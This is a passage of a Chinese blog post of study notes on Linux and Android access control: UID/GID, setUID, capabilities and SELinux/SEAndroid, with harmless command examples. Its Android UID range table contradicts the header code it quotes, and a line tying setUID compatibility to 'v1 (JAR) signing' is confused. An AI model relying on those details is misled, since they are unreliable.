id=\"进程边界的安全围栏：全局数据和服务的不可访问性\"><a href=\"#进程边界的安全围栏：全局数据和服务的不可访问性\" class=\"headerlink\" title=\"进程边界的安全围栏：全局数据和服务的不可访问性\"></a>进程边界的安全围栏：全局数据和服务的不可访问性</h2><p>回顾和总结</p>\n<h1 id=\"多用户和多用户边界\"><a href=\"#多用户和多用户边界\" class=\"headerlink\" title=\"多用户和多用户边界\"></a>多用户和多用户边界</h1><h2 id=\"需求背景\"><a href=\"#需求背景\" class=\"headerlink\" title=\"需求背景\"></a>需求背景</h2><p>资源缺乏<br>中央统一管理</p>\n<h2 id=\"多用户的边界：独立的工作目录\"><a href=\"#多用户的边界：独立的工作目录\" class=\"headerlink\" title=\"多用户的边界：独立的工作目录\"></a>多用户的边界：独立的工作目录</h2><p>独立的老巢<br>/home/nuoen</p>\n<h2 id=\"多用户的边界：可操作-访问的资源\"><a href=\"#多用户的边界：可操作-访问的资源\" class=\"headerlink\" title=\"多用户的边界：可操作/访问的资源\"></a>多用户的边界：可操作/访问的资源</h2><p>资源分类<br>权限管理</p>\n<h2 id=\"多用户的边界：可执行的操作\"><a href=\"#多用户的边界：可执行的操作\" class=\"headerlink\" title=\"多用户的边界：可执行的操作\"></a>多用户的边界：可执行的操作</h2><p>操作分类<br>权限管理</p>\n<h2 id=\"多用户的边界：UID和GID\"><a href=\"#多用户的边界：UID和GID\" class=\"headerlink\" title=\"多用户的边界：UID和GID\"></a>多用户的边界：UID和GID</h2><p>Name只是供看的<br>Identifier才是系统层面的标识<br>用户的行为是一系列进程的行为<br>特性标识其实是进程的UID/GID</p>\n<h1 id=\"进程和文件的UID-GID\"><a href=\"#进程和文件的UID-GID\" class=\"headerlink\" title=\"进程和文件的UID/GID\"></a>进程和文件的UID/GID</h1><h2 id=\"文件资源的权限力度：UID-GID\"><a href=\"#文件资源的权限力度：UID-GID\" class=\"headerlink\" title=\"文件资源的权限力度：UID/GID\"></a>文件资源的权限力度：UID/GID</h2><ul>\n<li>文件是一种资源</li>\n<li>在Linux中，甚至一切皆是文件，Socket,Driver</li>\n<li>文件资源对不同Target(用户)的不同操作权限的需求应运而生</li>\n<li>如何描述和区分不同的target? ID=====》UID===》唯一的</li>\n<li>某些场景下，允许多个不同的Target/用户 (而不是一个)具有一致的操作权限，怎么办？ID—-&gt;GID—-&gt;多个用户可以属于一个GID，一个用户可以属于多个GIDs</li>\n<li>所以文件权限的管理力度区分为3类群体：属于特定UID的用户，属于特定GID的用户（们），其他用户</li>\n<li>一个上帝用户存在：ROOT，其UID=0，上帝用户永远满足属于任何UID<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps -eo pid,uid,gid,user,args</span><br></pre></td></tr></table></figure>\n<h2 id=\"文件的可操作权限\"><a href=\"#文件的可操作权限\" class=\"headerlink\" title=\"文件的可操作权限\"></a>文件的可操作权限</h2>文件/文件夹的可读<br>文件/文件夹的可写<br>文件/文件夹的可执行<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -l </span><br><span class=\"line\">是否是文件夹|Owner用户权限|非Owner用户但是相同的组用户权限|既不是Owner用户也不是相同组的用户权限</span><br><span class=\"line\">*|***|***|***   UID  GID</span><br><span class=\"line\">drwxr-xr-x  2 root  root        4096 Apr 22  2024  mnt</span><br><span class=\"line\">drwxrwxr-x 29 nuoen nuoen       4096 Jun  7 04:55  msm</span><br><span class=\"line\">-rw-------  1 nuoen nuoen          0 May 20 11:20  nohup.out</span><br></pre></td></tr></table></figure>\n<h2 id=\"进程的标识：PID-UID-GID-GIDs\"><a href=\"#进程的标识：PID-UID-GID-GIDs\" class=\"headerlink\" title=\"进程的标识：PID,UID,GID,GIDs\"></a>进程的标识：PID,UID,GID,GIDs</h2>PID:进程的Unique Identifier。每次Running的PID可能相同，或者不同，由系统分配<br>UID:进程的身份标识。每次运行，即便重启后默认都相同。不同进程允许有相同的UID(用户身份标识)<br>GID:进程的（组）身份标识。每次运行，即便重启后默认都相同。不同进程允许有相同的GID(组用户身份标识)。同一进程允许属于多个GID<br>GIDs:进程所属的全部GID</li>\n</ul>\n<h2 id=\"Name-和-ID的映射\"><a href=\"#Name-和-ID的映射\" class=\"headerlink\" title=\"Name 和 ID的映射\"></a>Name 和 ID的映射</h2><p>android_filesystem_config.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* This is the master Users and Groups config for the platform.</span></span><br><span class=\"line\"><span class=\"comment\"> * DO NOT EVER RENUMBER</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_ROOT 0 <span class=\"comment\">/* traditional unix root user */</span></span></span><br><span class=\"line\"><span class=\"comment\">/* The following are for LTP and should only be used for testing */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_DAEMON 1 <span class=\"comment\">/* traditional unix daemon owner */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_BIN 2    <span class=\"comment\">/* traditional unix binaries owner */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_SYSTEM 1000 <span class=\"comment\">/* system server */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_RADIO 1001           <span class=\"comment\">/* telephony subsystem, RIL */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_BLUETOOTH 1002       <span class=\"comment\">/* bluetooth subsystem */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_GRAPHICS 1003        <span class=\"comment\">/* graphics devices */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_INPUT 1004           <span class=\"comment\">/* input devices */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_AUDIO 1005           <span class=\"comment\">/* audio devices */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_CAMERA 1006          <span class=\"comment\">/* camera devices */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_LOG 1007             <span class=\"comment\">/* log devices */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* The 3000 series are intended for use as supplemental group id&#x27;s only.</span></span><br><span class=\"line\"><span class=\"comment\"> * They indicate special Android capabilities that the kernel is aware of. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_NET_BT_ADMIN 3001 <span class=\"comment\">/* bluetooth: create any socket */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_NET_BT 3002       <span class=\"comment\">/* bluetooth: create sco, rfcomm or l2cap sockets */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_INET 3003         <span class=\"comment\">/* can create AF_INET and AF_INET6 sockets */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_NET_RAW 3004      <span class=\"comment\">/* can create raw INET sockets */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_APP 10000       <span class=\"comment\">/* <span class=\"doctag\">TODO:</span> switch users over to AID_APP_START */</span></span></span><br><span class=\"line\"><span class=\"comment\">/** android apk 的uid都是10000开始的 **/</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>📌 Android UID 分配机制概览<br>UID 范围    用途    示例<br>0 – 999    内核 / root / 守护进程    0=root, 100=logd<br>1000 – 1999    系统服务 / 框架进程    1000=system<br>2000 – 2999    硬件守护程序    2000=radio, 2001=bluetooth<br>3000 – 9999    其他核心服务（AID_*）    3004=audioserver, 1073=networkstack<br>10000 以上    普通 APK 应用    10123=com.x.app</p>\n<p>📦 普通应用为什么是 10000+？<br>    •    安装 APK 时，如果没有 <sharedUserId>：<br>    •    PackageManager 自动从 10000 开始为应用动态分配 UID。<br>    •    多用户模式下会按：</p>\n<p>app_uid = user_id * 100000 + app_id</p>\n<pre><code>•    如果有 &lt;sharedUserId&gt;，且不是 AID 预定义的 UID：\n•    必须满足条件：系统签名 + 安装在 system/priv-app。\n•    否则系统拒绝安装。\n</code></pre>\n<p>⸻</p>\n<h2 id=\"chmod-和-chown-命令介绍\"><a href=\"#chmod-和-chown-命令介绍\" class=\"headerlink\" title=\"chmod 和 chown 命令介绍\"></a>chmod 和 chown 命令介绍</h2><p>文件R/W/X的系统内部采用3Bit表示，R为最高位比特，置位为0x04,W为中间比特，置位为0x02,X为最低位比特，置位为0x01<br>shell中表示时，置位使用相应R/W/X表示，未置位使用-<br>操作文件面向群体的操作权限时，使用Chomd，可以直接使用数字，也可以使用助记符<br>(a:all ,u:owner user,g:group, +:add one permission, -:remove one permission)</p>\n<p>chown 命令用于改变文件的所有者和所属组(UID和GID)<br>SHELL命令中通常采用Name方式修改，而不是ID方式<br>一般格式： chown newUID : newGID FileName</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chown system:system nohup.out</span><br></pre></td></tr></table></figure>\n<h2 id=\"UID-GID的衔接\"><a href=\"#UID-GID的衔接\" class=\"headerlink\" title=\"UID/GID的衔接\"></a>UID/GID的衔接</h2><p>Linux一切皆是文件<br>文件基于UID/GID来划分它的面向群体，对它的面向群体定义不同的操作权限<br>用户的行为映射为进程的运行<br>进程的运行使用进程的UID/GID来标识自己的身份<br>进程的UID/GID&lt;=======&gt;文件的UID/GID 完美衔接！！<br>进程的UID/GID除了被授予可操作文件的范畴外，非文件范畴的需要进行权限控制的操作（如重启系统等特权操作）继续通过进程的UID/GID身份来进行控制和授权<br>比如，对于Reboot这个API,其入口处可以check calling的Process的UID,如果不是Root，则Reject</p>\n<h1 id=\"进程的-Real-UID-和-Effective-UID\"><a href=\"#进程的-Real-UID-和-Effective-UID\" class=\"headerlink\" title=\"进程的 Real UID 和 Effective UID\"></a>进程的 Real UID 和 Effective UID</h1><h2 id=\"身份的标识：Real-UID\"><a href=\"#身份的标识：Real-UID\" class=\"headerlink\" title=\"身份的标识：Real UID\"></a>身份的标识：Real UID</h2><ul>\n<li>进程的UID只是泛称，其实有很多种不同的UID</li>\n<li>进程的Real UID是进程的身份的标识，用来说明 Who am I</li>\n<li>仅仅说明Who am I,但是没有“实权”是不行的</li>\n<li>Linux中，进程能做什么事情不是由Real UID决定的</li>\n<li>Real UID仅仅是身份，有身份没有权利是无用的<h2 id=\"权利的标识：Effective-UID\"><a href=\"#权利的标识：Effective-UID\" class=\"headerlink\" title=\"权利的标识：Effective UID\"></a>权利的标识：Effective UID</h2></li>\n<li>有身份无权利是不行的</li>\n<li>Effective UID是进程的权利的标识，标识了该进程的“权利”</li>\n<li>Linux中的进程的授权（即，当前进程具有的操作权限）是靠Effective UID来识别的</li>\n<li>有权利就能做一切，Linux中具有“特权”Effective UID的进程能为所欲为</li>\n<li>之前课时说明的，文件，资源以及特权API操作时对进程是否有权限的识别的UID,即是指Effective UID<h2 id=\"身份和权利的关系\"><a href=\"#身份和权利的关系\" class=\"headerlink\" title=\"身份和权利的关系\"></a>身份和权利的关系</h2></li>\n<li>一般情况下，身份和权利是一致的，即 Real UID = Effective UID</li>\n<li>所以，默认PS CMD 输出的UID指的是Effective UID,而没有输出Real UID<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux</span><br><span class=\"line\">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class=\"line\">root           1  0.0  0.0 170644 14180 ?        Ss   Jun28   0:51 /sbin/init splash</span><br><span class=\"line\">root           2  0.0  0.0      0     0 ?        S    Jun28   0:00 [kthreadd]</span><br><span class=\"line\">root           3  0.0  0.0      0     0 ?        I&lt;   Jun28   0:00 [rcu_gp]</span><br><span class=\"line\">root           4  0.0  0.0      0     0 ?        I&lt;   Jun28   0:00 [rcu_par_gp]</span><br></pre></td></tr></table></figure></li>\n<li>我们也可以显式的显示完整的Effective UID 和 Real UID<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看所有进程的真实/有效 UID、GID</span></span><br><span class=\"line\">ps -eo pid,ruid,euid,rgid,egid,user,comm</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">仅看某个 PID（示例：1234）</span></span><br><span class=\"line\">ps -o pid,ruid,euid,rgid,egid,cmd -p 1234</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从 /proc 读取（同时可见 Capability）</span></span><br><span class=\"line\">cat /proc/1234/status | egrep &#x27;Uid:|Gid:|Cap(Inh|Prm|Eff)&#x27;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ROOT用户的特权\"><a href=\"#ROOT用户的特权\" class=\"headerlink\" title=\"ROOT用户的特权\"></a>ROOT用户的特权</h2></li>\n<li>我们所指的root用户，均是Effective UID = root的进程，尽管一般情况下，Real UID = Effective UID</li>\n<li>Effective UID = root的进程具有“皇权”，他不受任何限制，可以为所欲为</li>\n<li>它可以为自己正身：如果自己的身份（Real UID）不是root，它可以将自己的身份名正言顺的改为root(调用SetXUID),从而使身份和权利均是root</li>\n<li>它也可以自降为庶民：出家皈依，将自己的Real UID 和 Effective UID 都设置（降低，也是调用SetXUID）为庶民（非特权普通的Real UID,Effective UID），从而失去特权.<h2 id=\"UID的世袭\"><a href=\"#UID的世袭\" class=\"headerlink\" title=\"UID的世袭\"></a>UID的世袭</h2></li>\n<li>在linux世界里，为了安全考虑，UID的世袭遵循：身份世袭而权利不世袭的准则</li>\n<li>子进程的Real UID = Effective UID = 父进程的Real UID</li>\n<li>这使得临时夺权且尚位正身（普通Real UID 而特权Effective UID）的进程的子嗣不能继承其特权而仅能继承其的正身 （Real UID）</li>\n</ul>\n<h1 id=\"文件setUID标识\"><a href=\"#文件setUID标识\" class=\"headerlink\" title=\"文件setUID标识\"></a>文件setUID标识</h1><h2 id=\"平民身份、皇族特权的需求背景\"><a href=\"#平民身份、皇族特权的需求背景\" class=\"headerlink\" title=\"平民身份、皇族特权的需求背景\"></a>平民身份、皇族特权的需求背景</h2><ul>\n<li>Linux中的password是一个可执行程序（CMD），用于修改用户的密码</li>\n<li>Passwd需要操作多用户的账号文件（该文件高度安全，仅有ROOT用户可以读写）</li>\n<li>普通用户难道不能修改自己的密码？</li>\n<li>Passwd进程虽然是平民身份（普通用户启动它），却需要皇族的权利。身份和权利不一致。<h2 id=\"如何解决\"><a href=\"#如何解决\" class=\"headerlink\" title=\"如何解决\"></a>如何解决</h2>临时提升特权（Effective UID = root）而维持身份不变（Real UID = 普通用户），使得其利用特权行使职责时可避免世袭的安全问题。<h2 id=\"Linux的文件setUID标识\"><a href=\"#Linux的文件setUID标识\" class=\"headerlink\" title=\"Linux的文件setUID标识\"></a>Linux的文件setUID标识</h2></li>\n<li>文件的Owner UID设置为特殊用户，比如ROOT</li>\n<li>文件面向Owner UID的群体（第一组标志）的操作权限增加额外的setUID标识</li>\n<li>Linux系统保证，任何用户（进程）执行该可执行文件（会Fork一个新的进程来加载该可执行文件running）时，该可执行文件所在的子进程的Real UID仍然继承其父进程的Real UID，但是其Effective UID不再等于其父的Real UID而是被提升到该可执行文件的Owner UID<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -l | grep passwd</span><br><span class=\"line\">-rwsr-xr-x 1 root root         88464 Feb  6  2024 gpasswd</span><br><span class=\"line\">-rwxr-xr-x 1 root root        254160 Dec  2  2022 grub-mkpasswd-pbkdf2</span><br><span class=\"line\">-rwsr-xr-x 1 root root         68208 Feb  6  2024 passwd</span><br></pre></td></tr></table></figure>\n<h2 id=\"Chomd设置setUID的方式\"><a href=\"#Chomd设置setUID的方式\" class=\"headerlink\" title=\"Chomd设置setUID的方式\"></a>Chomd设置setUID的方式</h2></li>\n<li>和基本的RWX设置类似，有助记符和直接数字设置。直接数字设置时，采用4位数字，其中第一位标志setUID<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 4775 xxx.file //设置setUID</span><br><span class=\"line\">chmod 0775 xxx.file //取消setUID</span><br></pre></td></tr></table></figure>\n<h2 id=\"setUID的安全问题\"><a href=\"#setUID的安全问题\" class=\"headerlink\" title=\"setUID的安全问题\"></a>setUID的安全问题</h2></li>\n<li>sUID的进程的EUID提升了</li>\n<li>sUID的进程的RUID默认没有提升</li>\n<li>在sUID进程的RUID没有正身（也设置为ROOT）之前，其子民的RUID/EUID只是平民,此时是安全的</li>\n<li>要依据实际场景，有限制的决定是否要在sUID进程中为自己正身，需要明确知道其后果是，其任何子民的RUID/EUID均会提升至贵族（ROOT）</li>\n<li>两个例子，passwd（未正身），Android的su（正身）<h2 id=\"有RealGID-EffecitveGID-setGID吗\"><a href=\"#有RealGID-EffecitveGID-setGID吗\" class=\"headerlink\" title=\"有RealGID,EffecitveGID,setGID吗\"></a>有RealGID,EffecitveGID,setGID吗</h2></li>\n<li>存在，待看</li>\n</ul>\n<h2 id=\"文件-Capability（setcap-getcap）\"><a href=\"#文件-Capability（setcap-getcap）\" class=\"headerlink\" title=\"文件 Capability（setcap/getcap）\"></a>文件 Capability（setcap/getcap）</h2><ul>\n<li>除了 setUID 之外，现代 Linux/Android 更推荐使用 <strong>文件 Capability</strong> 赋权，避免一刀切的 root 特权。</li>\n<li>常用命令：<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">赋予二进制绑定低端口能力（示例）</span></span><br><span class=\"line\">sudo setcap &#x27;cap_net_bind_service=+ep&#x27; /path/to/bin</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看文件能力</span></span><br><span class=\"line\">getcap /path/to/bin</span><br></pre></td></tr></table></figure></li>\n<li>在 Android 上，系统分区的二进制能力通常由构建系统打包时附加；第三方 App 无法随意为自身可执行文件设置 capability。</li>\n</ul>\n<p>如此管理权限颗粒度太粗，不够精细，所以引入了Capability机制</p>\n<h1 id=\"Linux的Capability机制\"><a href=\"#Linux的Capability机制\" class=\"headerlink\" title=\"Linux的Capability机制\"></a>Linux的Capability机制</h1><h2 id=\"UID怎么了\"><a href=\"#UID怎么了\" class=\"headerlink\" title=\"UID怎么了\"></a>UID怎么了</h2><ul>\n<li>权限颗粒太粗</li>\n<li>容易引起权利过剩（溢出）</li>\n<li>权利溢出/过剩引起的安全问题<h2 id=\"Capability-细粒度的权限控制\"><a href=\"#Capability-细粒度的权限控制\" class=\"headerlink\" title=\"Capability:细粒度的权限控制\"></a>Capability:细粒度的权限控制</h2></li>\n<li>我们需要细粒度的权限</li>\n<li>除了皇帝，我们也需要不同的地方官</li>\n<li>Linux引入了Capability:每个Capability系统内以一位Bit代表，OS内部使用64bit存储<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//android_filesystem_capability.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_CHOWN 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_DAC_OVERRIDE 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_DAC_READ_SEARCH 2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_FOWNER 3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_FSETID 4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_KILL 5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SETGID 6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SETUID 7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SETPCAP 8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_LINUX_IMMUTABLE 9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_NET_BIND_SERVICE 10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_NET_BROADCAST 11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_NET_ADMIN 12</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_NET_RAW 13</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_IPC_LOCK 14</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_IPC_OWNER 15</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_MODULE 16</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_RAWIO 17</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_CHROOT 18</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_PTRACE 19</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CAP_SYS_PACCT 20</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"进程的Capability\"><a href=\"#进程的Capability\" class=\"headerlink\" title=\"进程的Capability\"></a>进程的Capability</h2></li>\n<li>Permitted Capability Sets<ul>\n<li>当前进程的权利的围栏，最大权利范围，是Effecitve Capability Sets的超集</li>\n</ul>\n</li>\n<li>Effective Capability Sets<ul>\n<li>当前进程的时机使用（支配）的权利集，该集内的Capability必须从属于Permitted Capability Sets。该集合与Effective UID类似，是实际的权利标识</li>\n</ul>\n</li>\n<li>Inheritable Capability Sets<ul>\n<li>子进程唯一可以直接继承的Capability Sets。在Capability模式下，只有子进程的Inheritable Capability Sets = 父进程的Inheritable Capabiltity Sets。其他皆是NO<h2 id=\"文件的Capability\"><a href=\"#文件的Capability\" class=\"headerlink\" title=\"文件的Capability\"></a>文件的Capability</h2></li>\n</ul>\n</li>\n<li>Permitted Capability Sets<ul>\n<li>该可执行文件可以为其进程带来的Permitted Capability Sets</li>\n</ul>\n</li>\n<li>Effective Capability Set<ul>\n<li>仅1bit,Enable or Disable ,标识该可执行文件running所在的进程的Permitted Capability Sets是否自动全部Assign到其Effective Capability Sets。通常用于与传统的Root-setUID可执行文件向下兼容。</li>\n</ul>\n</li>\n<li>Inheritable Capability Sets<ul>\n<li>与进程的Inheritable Capability Sets一起作用（位与）以决定新的进程的Permitted Capability Sets<h2 id=\"Capability-BoundSet\"><a href=\"#Capability-BoundSet\" class=\"headerlink\" title=\"Capability BoundSet\"></a>Capability BoundSet</h2></li>\n</ul>\n</li>\n<li>Capability BoundSet是进程的超集</li>\n<li>是进程自己为自己设定的安全围栏（Capability Sets），限制可执行文件的Permitted Capability Sets仅有局部能转化为进程的Permitted Capability Sets</li>\n<li>Capability BoundSet能够被子进程继承</li>\n<li>Init进程默认Capability BoundSet 为全1<h2 id=\"Spawn进程的Capability\"><a href=\"#Spawn进程的Capability\" class=\"headerlink\" title=\"Spawn进程的Capability\"></a>Spawn进程的Capability</h2>P’(permitted) = (P(inheritable) &amp; F(inheritable)) | (F(permitted) &amp; cap_bset)<br>P’(effective) = F(effective)?P’(permitted):0<br>P’(inheritable) = P(inheritable)<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/[pid]/status | grep Cap</span><br></pre></td></tr></table></figure>\n<h1 id=\"Capability与UID的兼容\"><a href=\"#Capability与UID的兼容\" class=\"headerlink\" title=\"Capability与UID的兼容\"></a>Capability与UID的兼容</h1></li>\n<li>新技术必须向下（前）兼容，要保证旧的实体（应用）工作正常</li>\n<li>旧的应用：Capability - dumb进程<br>Permitted Capability Sets = Effective Capability Sets = Inheritable Capability Sets = 0x000000000000000,我不知道，我怎么设置？</li>\n<li>旧的可执行文件：Capability - dumb文件:<br>Root-setUID可执行文件，系统转变为Capability的方式为：File Effective Bit = True;File ‘s Permitted和Inheritable Capability Sets = 0xFFFFFFFFFFFFFFFF</li>\n<li>旧的 Root EUID 的进程：对使用 v1（JAR）签名时代的 setUID 兼容，<strong>File Effective Bit = true</strong> 时仍会将文件的 Permitted 能力集赋予进程（受 BoundSet 限制）。</li>\n<li>注意：公式中的常量应为 <strong>PR_CAPBSET</strong>（capability bound set），不是 PR_CAPBEST。<h1 id=\"高级特性\"><a href=\"#高级特性\" class=\"headerlink\" title=\"高级特性\"></a>高级特性</h1><h2 id=\"被ROOT了怎么办\"><a href=\"#被ROOT了怎么办\" class=\"headerlink\" title=\"被ROOT了怎么办\"></a>被ROOT了怎么办</h2></li>\n<li>手机被ROOT了怎么办</li>\n<li>恶意应用获取了ROOT权限怎么办？</li>\n<li>现在无能为力</li>\n<li>我们想怎么样？即便ROOT EUID的应用，仍然不能为所欲为<h2 id=\"SELinux\"><a href=\"#SELinux\" class=\"headerlink\" title=\"SELinux\"></a>SELinux</h2></li>\n<li>拯救英雄</li>\n<li>DAC和MAC的策略区别</li>\n<li>DAC(Discretionary Access Control)自主访问控制：传统U6 m0k9noijnix/Linux安全管理模型；主体对它所属的对象和运行的程序拥有全部的控制权</li>\n<li>MAC(Mandatory Access Control)强制访问控制：SELinux基于的安全策略；管理员管理访问控制。管理员指定策略，用户不能改变它。策略定义了哪个主体能访问哪个对象。采用最小特权方式，默认情况下应用程序和用户没有任何权限</li>\n<li>Web服务器的假想例子<br>DAC模式下，Web服务器进程具有ROOT权限，当恶意病毒攻击成功并注入Web服务器进程后，则可以利用Web服务器进程的ROOT权限，做任何事情。<br>MAC模式下：Web服务器进程所能操作的对象和权限均在安全策略中明确列出，比如，只允许访问网络和访问特定文件等。即便Web服务器被恶意病毒攻击注入了，你仍然无法借由Web服务器进程为所欲为，所有安全策略没有授权的行为仍然是不允许的。<h2 id=\"SEAndroid\"><a href=\"#SEAndroid\" class=\"headerlink\" title=\"SEAndroid\"></a>SEAndroid</h2></li>\n<li>与SELinux的关系<br>SEAndroid (Security-Enhanced Android) 将原本运用在Linux上的SELinux技术移植到了Android平台上</li>\n<li>与SELinux的区别<br>除了移植SELinux以外，还做了很多针对Android的安全提高，比如把Binder IPC、Socket、Properites访问控制加入到了SEAndroid的控制中。</li>\n<li>SEAndroid的核心理念<br>即使恶意应用篡得了ROOT权限，恶意应用仍然被优先的控制着仍然不能为所欲为。</li>\n</ul>\n<h2 